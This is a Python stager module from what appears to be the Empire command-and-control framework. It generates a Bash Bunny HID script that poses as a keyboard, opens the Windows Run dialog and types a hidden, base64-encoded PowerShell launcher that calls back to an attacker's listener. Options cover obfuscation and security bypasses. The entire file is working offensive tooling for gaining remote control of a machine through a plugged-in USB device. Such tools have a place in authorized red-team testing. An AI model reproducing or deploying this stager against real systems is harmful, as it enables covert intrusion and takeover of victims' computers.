import logging

from empire.server.common import helpers

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "BunnyLauncher",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                },
                {
                    "Name": "",
                    "Handle": "@kisasondi",
                    "Link": "",
                },
            ],
            "Description": "Generates a bunny script that runs a one-liner stage0 launcher for Empire.",
            "Comments": [
                "This stager is modification of the ducky stager by @harmj0y,",
                "Current other language (keyboard layout) support is trough DuckyInstall from https://github.com/hak5/bashbunny-payloads",
            ],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for "
                "obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For "
                "powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "Keyboard": {
                "Description": "Use a different layout then EN. Add a Q SET_LANGUAGE stanza for various keymaps, "
                "try DE, HR...",
                "Required": False,
                "Value": "",
            },
            "Interpreter": {
                "Description": "Interpreter for code (Defaults to powershell, since a lot of places block cmd.exe)",
                "Required": False,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "cmd"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        # default booleans to false
        obfuscate_script = False

        # extract all of our options
        language = self.options["Language"]["Value"]
        interpreter = self.options["Interpreter"]["Value"]
        keyboard = self.options["Keyboard"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        bypasses = self.options["Bypasses"]["Value"]
        if self.options["Obfuscate"]["Value"].lower == "true":
            obfuscate_script = True
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]

        if language == "powershell":
            # generate the launcher code
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=True,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                bypasses=bypasses,
            )
        elif language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=True,
                listener_name=listener_name,
            )

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        enc = launcher.split(" ")[-1]
        bunny_code = "#!/bin/bash\n"
        bunny_code += "LED R G\n"
        bunny_code += "source bunny_helpers.sh\n"
        bunny_code += "ATTACKMODE HID\n"
        if keyboard != "":
            bunny_code += "Q SET_LANGUAGE " + keyboard + "\n"
        bunny_code += "Q DELAY 500\n"
        bunny_code += "Q GUI r\n"
        bunny_code += "Q STRING " + interpreter + "\n"
        bunny_code += "Q ENTER\n"
        bunny_code += "Q DELAY 500\n"
        bunny_code += "Q STRING powershell -W Hidden -nop -noni -enc " + enc + "\n"
        bunny_code += "Q ENTER\n"
        bunny_code += "LED R G B 200\n"
        return bunny_code
